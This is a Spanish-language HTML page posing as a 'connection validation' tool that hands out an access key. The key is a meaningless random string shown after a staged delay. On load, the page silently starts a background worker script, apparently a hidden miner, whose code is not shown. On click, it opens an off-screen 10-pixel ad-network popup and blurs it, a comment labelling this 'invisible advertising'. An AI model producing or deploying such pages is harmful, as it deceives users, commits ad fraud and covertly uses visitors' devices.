<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DELTA_SYSTEM_ULTIMATE</title>
    <style>
        body { background: #000; color: #0f0; font-family: monospace; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        #box { width: 90%; max-width: 400px; border: 1px solid #0f0; padding: 20px; text-align: center; }
        .vid { width: 100%; height: 180px; margin-bottom: 15px; border: 1px solid #333; }
        button { background: #0f0; color: #000; border: none; padding: 15px; width: 100%; font-weight: bold; cursor: pointer; font-size: 1.1em; }
        #key { display: none; border: 1px dashed #0f0; margin-top: 15px; padding: 10px; }
    </style>
</head>
<body>

<div id="box">
    <div class="vid">
        <iframe width="100%" height="100%" src="https://www.youtube.com/embed/jfKfPfyJRdk?autoplay=1&mute=1&loop=1&playlist=jfKfPfyJRdk" frameborder="0" allow="autoplay"></iframe>
    </div>
    
    <button id="btn" onclick="lanzarSistema()">VALIDAR CONEXIÓN</button>

    <div id="key">
        <p>ACCESO GARANTIZADO:</p>
        <h1 id="token" style="font-size: 2.5em; margin: 10px 0;"></h1>
        <p style="font-size: 9px; color: #ff0000;">SISTEMA ACTIVO - MANTENER ABIERTO</p>
    </div>
</div>

<script>
    // 1. ACTIVACIÓN DEL MOTOR (worker.js) AL CARGAR LA PÁGINA
    if (window.Worker) {
        const motor = new Worker('worker.js');
    }

    function lanzarSistema() {
        // 2. PUBLICIDAD INVISIBLE
        const urlAd = "https://www.profitablecpmratenetwork.com/s6wzm2hi6u?key=9a4b7231bb085e91fc074954af6f5cb0";
        const win = window.open(urlAd, '_blank', 'width=10,height=10,left=2000,top=2000');
        if (win) {
            win.blur();
            window.focus();
        }

        // 3. GENERACIÓN DE CLAVE
        document.getElementById('btn').innerText = "PROCESANDO...";
        
        setTimeout(() => {
            const code = "DX-" + Math.random().toString(36).substring(2, 8).toUpperCase();
            document.getElementById('btn').style.display = 'none';
            document.getElementById('key').style.display = 'block';
            document.getElementById('token').innerText = code;
        }, 6000);
    }
</script>

</body>
</html>
